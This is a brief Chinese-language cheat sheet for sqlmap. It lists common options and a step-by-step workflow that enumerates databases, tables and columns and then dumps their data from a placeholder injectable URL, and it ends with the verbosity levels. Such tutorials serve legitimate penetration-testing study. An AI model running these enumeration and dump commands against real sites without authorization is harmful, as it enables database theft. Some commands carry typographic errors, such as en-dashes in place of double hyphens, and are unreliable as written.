# sqlmap的使用

### 常用的参数

- -u或者–url 指定注入目标URL
	python sqlmap.py -u http://ip/index.php?id=1
- –dbms 指定数据库
	python sqlmap.py -u http://ip/index. php?id=1 –dbms=mysql
- –os 指定系统
	python sqlmap.py -u http://ip/index.php?id=1 –os=Windows
- –flush-session 清空session
	python sqlmap.py -u http://ip/index.php?id=1 –flush-session
- –proxy 指定代理
	python sqlmap.py -u http://ip/index.php?id=1 –proxy http://ip:port–user-agent
- 指定useragent信息
	python sqlmap.py -u http://ip/index.php?id=1
	–user-agent='Mozilla/5.0 (Windows NT 10.0;WOW64;rv:55.0) Gecko/20100101 Firefox/55.0'
- –data 数据以POST方式提交
	python sqlmap.py -u http://ip/index.php –data="id=1"
- method指定请求方法
	--method=MEHOTD：强制指定HTTP方法（如PUT）
- referer指定来源
	--referer=REFERER：指定HTTP头部中的referer值
- 设置cookie
	python sqlmap.py -u "http://ip/user.php" --cookie "JSESSIONID=E5D6C8C81;NAME=werner;"
- 指定注入方式为延时注入爆表
	python sqlmap -u
	"http://ip/user.php?name=lil"
	--technique=T --dbms mysql -dbs

### 注入过程

- 列出所有的数据库
	python sqlmap.py -u http://ip/index.php?id=1 –dbs
- 列出当前数据库
	python sqlmap.py -u http://ip/index.php?id=1 –current-db
- 列出DBname数据库所有的表
	python sqlmap.py -u http://ip/index.php?id=1 -D ‘DBname’ –tables
- 列出DBname数据库table表中的所有字段
	python sqlmap.py -u http://ip/index.php?id=1 -D ‘DBname’ -T ‘table’ –columns
- 转存DBname数据库table表中 column1,column2字段中的数据
	python sqlmap.py -u http://ip/index.php?id=1 -D ‘DBname’ -T ‘table’ -C ‘column1,column2’ –dump

### 输出详细等级

选项：-v

该选项用于设置输出信息的详细等级，共有七个级别。

默认级别为 1，输出包括普通信息，警告，错误，关
键信息和 Python 出错回遡信息（如果有的话）。

0：只输出 Python 出错回溯信息，错误和关键信息。

1：增加输出普通信息和警告信息。

2：增加输出调试信息。

3：增加输出已注入的 payloads。

4：增加输出 HTTP 请求。

5：增加输出 HTTP 响应头

6：增加输出 HTTP 响应内容


>参考材料 https://sssurou.github.io/2023/08/18/sqlmap/
>https://zhuanlan.zhihu.com/p/485603130?utm_id=0